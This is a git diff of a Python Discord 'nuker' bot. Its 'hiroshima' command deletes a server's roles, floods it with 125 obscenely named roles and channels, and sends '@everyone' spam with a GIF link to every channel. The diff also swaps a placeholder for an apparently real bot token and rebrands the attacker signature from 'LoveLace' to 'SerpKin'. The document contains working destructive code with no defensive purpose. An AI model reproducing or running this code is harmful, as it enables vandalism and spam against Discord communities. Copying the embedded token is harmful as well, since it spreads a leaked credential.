@@ -5,7 +5,7 @@ import colorama
 from colorama import Fore, Back, Style, init
 init()
 
-TOKEN = "TOKEN"
+TOKEN = "MTA4MjYzMDAwNDMwNDc4MTM3NA.GgK1Oo.FZfrc03l9zeSu6LE8UOo5zAhu0UMVHo3kyDNmU"
 
 client = commands.Bot(command_prefix = ";")
 client.remove_command("help")
@@ -39,15 +39,15 @@ async def hiroshima(ctx):
             print("  DELETING ROLES: FAILED")
     for _i in range(125):
         try:
-            await ctx.guild.create_role(name="Fucked By LoveLace.")
+            await ctx.guild.create_role(name="Fucked By SerpKin.")
         except:
             print("  CREATING ROLES: FAILED")
     for _i in range(125):
-        await ctx.guild.create_text_channel(name="Fucked By LoveLace.")
+        await ctx.guild.create_text_channel(name="Fucked By SerpKin.")
     for channel in list(ctx.guild.channels):
         for _i in range(5):
             try:
-                await channel.send("@everyone Server Just Got Fucked By Lovelace.")  
+                await channel.send("@everyone SerpKin on top https://media.discordapp.net/attachments/899357305273991179/907257662163537940/SPOILER_file.gif.")  
             except:
                 print("  CREATING ROLES: FAILED")  
 
